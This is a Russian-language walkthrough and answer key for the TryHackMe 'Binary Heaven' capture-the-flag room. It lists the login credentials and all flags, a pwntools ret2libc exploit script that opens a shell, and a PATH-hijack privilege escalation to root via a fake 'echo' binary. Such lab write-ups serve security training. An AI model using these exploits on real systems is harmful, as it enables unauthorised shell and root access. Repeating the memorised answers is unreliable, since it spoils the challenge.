[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Binary Heaven](https://tryhackme.com/r/room/binaryheaven) 

Всего 5 заданий:
## Задание 1
 Наслаждайтесь раем двоичных файлов, пока можете

ОТДАВАТЬ:

Эта комната также является частью розыгрыша. Те, кто заполнит эту комнату до 10 мая 2021 г. 20:00 GMT+1 (британское 
летнее время), будут участвовать в лотерее. Призы: 3 ваучера на подписку TryHackMe на 1 месяц (любезно 
предоставлены nickapic) и 5 ваучеров на подписку TryHackMe на 1 месяц (любезно предоставлены bushidosan).

Примечание: По очевидным причинам, в течение первых 72 часов после открытия этой комнаты не будет предоставлено 
решение и не будет опубликовано описание. Любой, кто будет пойман на мошенничестве, будет исключен из розыгрыша.

Разверните ВМ и двигайтесь дальше. Пока ВМ полностью загрузится, перейдите к Задаче 2 и начните свое путешествие.

### Ответьте на вопросы ниже
Я развернул виртуальную машину!
```commandline
Ответ не нужен
```

## Задание 2
Чтобы попасть на небеса, нужно сначала показать, достойны вы или нет. Вот два ангела с небес бинарности, подойдите к 
ним с радостью, и вы получите счастье.

Контрольная сумма SHA-256 : 5bdb0828249ef7a8fb84b5040a4ae6735e7c9269ab1f288ca32be1cf5e96d86d

### Ответьте на вопросы ниже
Какое имя пользователя?
```commandline
guardian
```
Какой пароль?
````commandline
GOg0esGrrr!
````
Что такое флаг?
```commandline
THM{crack3d_th3_gu4rd1an}
```

## Задание 3
Сможете ли вы стать бинексбогом?
### Ответьте на вопросы ниже
binexgod_flag.txt
```commandline
ssh guardian@<IP>
GOg0esGrrr!

nano exploit.py

from pwn import *

elf = context.binary = ELF('./pwn_me')
libc = elf.libc
p = process()

#get the leaked address
p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

#set our libc address according to the leaked address
libc.address = system_leak - libc.sym['system']
log.success('LIBC base: {}'.format(hex(libc.address)))

#get location of binsh from libc
binsh = next(libc.search(b'/bin/sh'))

#build the rop chain
rop = ROP(libc)
rop.raw('A' * 32)
rop.system(binsh)

#send our rop chain
p.sendline(rop.chain())

#Get the shell
p.interactive()

python3 exploit.py
```
```commandline
THM{b1n3xg0d_pwn3d}
```

## Задание 4
Ты стал богом бинекса, но сможешь ли ты получить корневой флаг небес?
### Ответьте на вопросы ниже
корень.txt
```commandline
cd /home/binexgod
echo '#include<stdio.h>
#include<stdlib.h>

int main()
{
  system("/bin/bash");
}' >> echo.c



gcc -o echo echo.c
chmod 777 echo
echo $PATH
export PATH=/tmp:$PATH


./vuln

cat /root/root.txt
```
```commandline
THM{r00t_of_th3_he4v3n}
```

## Задание 5
Поздравляем с завершением комнаты! Мы хотели бы поблагодарить вас за то, что вы потратили время на то, чтобы 
пройтись по этой комнате, на создание которой мы потратили много времени и усилий. Мы искренне надеемся, что вы 
узнали что-то новое. До следующего раза, увидимся!

Если вы обнаружили какую-либо проблему или хотите оставить отзыв, свяжитесь с нами в Discord: swanandx#8944 или Lammm#7495.

Также не стесняйтесь подписываться на нас в Twitter: @swanandx и @Lammm.

### Ответьте на вопросы ниже
Большое спасибо!
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)